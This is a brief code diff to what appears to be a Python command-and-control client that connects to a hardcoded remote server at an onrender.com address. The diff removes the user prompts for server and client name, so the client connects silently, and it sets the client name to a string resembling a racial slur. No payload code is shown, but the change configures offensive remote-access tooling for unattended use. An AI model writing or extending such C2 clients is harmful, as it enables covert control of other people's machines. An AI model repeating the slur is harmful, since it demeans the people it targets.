@@ -394,14 +394,14 @@ def main():
     
     default_server = "https://c2-server-io.onrender.com"
     
-    server_url = input(f"🌐 Server [{default_server}]: ").strip()
+    server_url = default_server
     if not server_url:
         server_url = default_server
     
     if not server_url.startswith('http'):
         server_url = 'https://' + server_url
     
-    client_name = input(f"🏷️  Name [{platform.node()}]: ").strip()
+    client_name = ("nigaaa")
     if not client_name:
         client_name = platform.node()
     
@@ -410,3 +410,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
